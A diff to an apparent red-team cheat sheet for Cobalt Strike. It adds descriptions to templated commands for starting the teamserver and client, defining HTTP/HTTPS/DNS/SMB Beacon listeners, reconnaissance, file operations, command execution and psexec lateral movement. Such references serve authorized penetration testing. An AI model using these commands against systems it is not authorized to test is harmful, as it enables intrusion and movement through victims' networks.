@@ -6,6 +6,8 @@
 
 Start teamserver with Cobalt Strike.
 
+Start a Cobalt Strike teamserver.
+
 ```sh title:"Cobalt Strike Start Teamserver"
 ./teamserver "$external_ip" "$teamserver_pass"
 ```
@@ -18,6 +20,8 @@ var teamserver_pass
 
 Start client with Cobalt Strike.
 
+Start the Cobalt Strike client.
+
 ```sh title:"Cobalt Strike Start Client"
 ./cobaltstrike
 ```
@@ -28,6 +32,8 @@ Start client with Cobalt Strike.
 ### HTTP listener
 
 List HTTP listener with Cobalt Strike.
+
+Aggressor listener block for HTTP Beacon.
 
 ```sh title:"Cobalt Strike List HTTP Listener"
 listener http { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; }
@@ -40,6 +46,8 @@ var lport
 ### HTTPS listener
 
 List HTTPS listener with Cobalt Strike.
+
+Aggressor listener block for HTTPS Beacon.
 
 ```sh title:"Cobalt Strike List HTTPS Listener"
 listener https { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; set Cert "$certificate_path"; }
@@ -54,6 +62,8 @@ var certificate_path
 
 List DNS listener with Cobalt Strike.
 
+Aggressor listener block for DNS Beacon.
+
 ```sh title:"Cobalt Strike List DNS Listener"
 listener dns { set Host "$domain"; set Port "$lport"; set BindPort "$lport"; }
 ```
@@ -65,6 +75,8 @@ var lport
 ### SMB listener
 
 List SMB listener with Cobalt Strike.
+
+Aggressor listener block for SMB Beacon.
 
 ```sh title:"Cobalt Strike List SMB Listener"
 listener smb { set PipeName "$pipe_name"; }
@@ -78,6 +90,8 @@ var pipe_name
 ### Basic commands
 
 Execute basic commands with Cobalt Strike.
+
+Common Beacon job controls.
 
 ```sh title:"Cobalt Strike Execute Basic Commands"
 help
@@ -94,6 +108,8 @@ var job_id
 
 Show system info with Cobalt Strike.
 
+Common Beacon situational awareness commands.
+
 ```sh title:"Cobalt Strike Show System Info"
 whoami
 hostname
@@ -106,6 +122,8 @@ netstat
 ### File operations
 
 Run file operations with Cobalt Strike.
+
+Common Beacon file operations.
 
 ```sh title:"Cobalt Strike Run File Operations"
 ls $path
@@ -122,6 +140,8 @@ var file
 
 Execute commands with Cobalt Strike.
 
+Common Beacon execution commands.
+
 ```sh title:"Cobalt Strike Execute Commands"
 shell $command
 execute $command
@@ -134,6 +154,8 @@ var command
 ### Lateral movement
 
 Execute lateral movement with Cobalt Strike.
+
+Common Beacon lateral movement commands.
 
 ```sh title:"Cobalt Strike Execute Lateral Movement"
 psexec $target $command
